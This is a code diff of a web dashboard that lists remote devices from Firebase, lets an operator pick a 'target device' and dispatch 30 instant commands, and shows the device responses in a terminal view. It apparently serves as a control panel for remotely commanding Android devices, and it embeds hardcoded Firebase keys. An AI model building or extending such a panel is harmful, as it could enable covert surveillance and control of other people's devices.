@@ -15,7 +15,6 @@
         ::-webkit-scrollbar-track { background: #0f172a; }
         ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
         ::-webkit-scrollbar-thumb:hover { background: #475569; }
-        .glow-green { text-shadow: 0 0 10px rgba(74, 222, 128, 0.5); }
     </style>
 </head>
 <body class="bg-slate-950 text-slate-100 h-screen flex flex-col overflow-hidden">
@@ -48,7 +47,6 @@
                 <input type="text" id="device-search" placeholder="Search device ID..." class="w-full bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 font-mono">
             </div>
             <div id="device-list" class="flex-1 overflow-y-auto divide-y divide-slate-800/60">
-                <!-- Dynamic devices -->
                 <div class="p-6 text-center text-xs text-slate-500 font-mono">Waiting for active device connection...</div>
             </div>
         </aside>
@@ -66,15 +64,13 @@
                 </div>
             </div>
 
-            <!-- Command Dispatcher Grid (30 Actions) -->
+            <!-- Command Dispatcher Grid -->
             <div class="p-4 bg-slate-900/30 border-b border-slate-800 overflow-y-auto max-h-64">
                 <div class="flex justify-between items-center mb-3">
                     <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Command Dispatcher (30 Actions)</h3>
                     <span class="text-[10px] text-slate-500 font-mono">Click command to execute instantly</span>
                 </div>
-                <div id="commands-grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2">
-                    <!-- Populated via JS -->
-                </div>
+                <div id="commands-grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-2"></div>
             </div>
 
             <!-- Terminal Output Viewer -->
@@ -96,27 +92,24 @@
         </main>
     </div>
 
-    <!-- Firebase Script & Logic -->
     <script>
         const firebaseConfig = {
-            apiKey: "AIzaSyBbyRTb26Op3Q9ovv4MrPEtr4obN9Ej_ko",
-            authDomain: "remot-b334d.firebaseapp.com",
-            databaseURL: "https://remot-b334d-default-rtdb.europe-west1.firebasedatabase.app",
-            projectId: "remot-b334d",
-            storageBucket: "remot-b334d.firebasestorage.app",
-            messagingSenderId: "740672688643",
-            appId: "1:740672688643:web:7a104590f2eb30b917f436"
+            apiKey: "AIzaSyB25yxZMF067LquxO4NwcM9Sa-ctmq5vuM",
+            authDomain: "corex-78632.firebaseapp.com",
+            databaseURL: "https://corex-78632-default-rtdb.firebaseio.com",
+            projectId: "corex-78632",
+            storageBucket: "corex-78632.firebasestorage.app",
+            messagingSenderId: "610437364551",
+            appId: "1:610437364551:android:e1f88f862a1550fbef2a62"
         };
 
         try {
             firebase.initializeApp(firebaseConfig);
-            const statusEl = document.getElementById('firebase-status');
-            statusEl.innerText = 'Firebase Connected';
-            statusEl.className = 'text-xs bg-slate-800 border border-emerald-500/30 px-3 py-1.5 rounded-full text-emerald-400 font-mono shadow-sm';
+            document.getElementById('firebase-status').innerText = 'Firebase Connected';
+            document.getElementById('firebase-status').className = 'text-xs bg-slate-800 border border-emerald-500/30 px-3 py-1.5 rounded-full text-emerald-400 font-mono shadow-sm';
         } catch (e) {
-            const statusEl = document.getElementById('firebase-status');
-            statusEl.innerText = 'Firebase Config Error';
-            statusEl.className = 'text-xs bg-slate-800 border border-red-500/30 px-3 py-1.5 rounded-full text-red-400 font-mono shadow-sm';
+            document.getElementById('firebase-status').innerText = 'Firebase Config Error';
+            document.getElementById('firebase-status').className = 'text-xs bg-slate-800 border border-red-500/30 px-3 py-1.5 rounded-full text-red-400 font-mono shadow-sm';
         }
 
         const db = firebase.database();
@@ -169,7 +162,6 @@
             grid.appendChild(btn);
         });
 
-        // Listen for devices
         db.ref('devices').on('value', snapshot => {
             devicesData = snapshot.val() || {};
             renderDeviceList();
@@ -236,7 +228,6 @@
 
             logTerminal(`[System] Selected target device: ${id}`);
             
-            // Listen to device data response
             db.ref(`devices/${id}/data`).limitToLast(1).on('child_added', snapshot => {
                 const val = snapshot.val();
                 if (val && selectedDeviceId === id) {
@@ -260,8 +251,7 @@
                 return;
             }
 
-            let arg = '';
-            let arg2 = '';
+            let arg = '', arg2 = '';
             if (cmd.hasArg) {
                 arg = prompt(`Enter parameter for ${cmd.name}:`, cmd.argPlaceholder || '');
                 if (arg === null) return;
@@ -285,7 +275,7 @@
         function logTerminal(text) {
             const term = document.getElementById('terminal-output');
             const time = new Date().toLocaleTimeString();
-            term.innerHTML += `\n<span class="text-slate-500">[${time}]</span> ${text}`;
+            term.innerHTML += `\n<span class="text-slate-550">[${time}]</span> ${text}`;
             term.scrollTop = term.scrollHeight;
         }
 
